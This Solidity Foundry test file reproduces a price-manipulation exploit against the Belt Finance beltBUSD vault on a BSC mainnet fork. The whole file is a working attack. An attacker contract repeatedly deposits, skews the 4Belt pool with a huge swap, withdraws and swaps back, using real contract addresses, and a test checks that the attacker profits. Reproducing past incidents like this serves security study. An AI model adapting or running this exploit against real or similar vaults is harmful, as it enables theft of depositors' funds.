// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IBeltBUSD is IERC20 {
    function deposit(
        uint256 amount,
        uint256 minShares
    ) external;
    function withdraw(
        uint256 shares,
        uint256 minAmount
    ) external;
}

interface I4BeltPool {
    function exchange(
        int128 fromIndex,
        int128 toIndex,
        uint256 amount,
        uint256 minAmount
    ) external;
}

contract BeltFinanceAttacker {
    IERC20 private constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 private constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IBeltBUSD private constant BELT_BUSD = IBeltBUSD(0x9171Bf7c050aC8B4cf7835e51F7b4841DFB2cCD0);
    I4BeltPool private constant FOUR_BELT = I4BeltPool(0x160CAed03795365F3A589f10C379FfA7d75d4E76);

    uint256 private constant MANIPULATION_AMOUNT = 190_000_000 ether;

    function attack() external {
        BUSD.approve(address(BELT_BUSD), type(uint256).max);
        BUSD.approve(address(FOUR_BELT), type(uint256).max);
        USDT.approve(address(FOUR_BELT), type(uint256).max);

        // Seed the vulnerable vault, then repeatedly exploit its inaccurate
        // share valuation while the underlying strategies rebalance.
        BELT_BUSD.deposit(10_000_000 ether, 0);
        for (uint256 i; i < 7; ++i) {
            BELT_BUSD.deposit(BUSD.balanceOf(address(this)) - MANIPULATION_AMOUNT, 0);
            FOUR_BELT.exchange(0, 2, MANIPULATION_AMOUNT, 0);
            BELT_BUSD.withdraw(BELT_BUSD.balanceOf(address(this)), 0);
            FOUR_BELT.exchange(2, 0, USDT.balanceOf(address(this)), 0);
        }
    }
}

contract BeltFinanceExploitTest is Test {
    IERC20 private constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    BeltFinanceAttacker private attacker;

    function setUp() public {
        vm.createSelectFork("bsc", 7_838_861);
        attacker = new BeltFinanceAttacker();
        deal(address(BUSD), address(attacker), 387_315_996_874_269_060_031_993_506);
    }

    function testExploit() public {
        uint256 beforeBalance = BUSD.balanceOf(address(attacker));
        attacker.attack();
        assertGt(BUSD.balanceOf(address(attacker)), beforeBalance);
    }
}
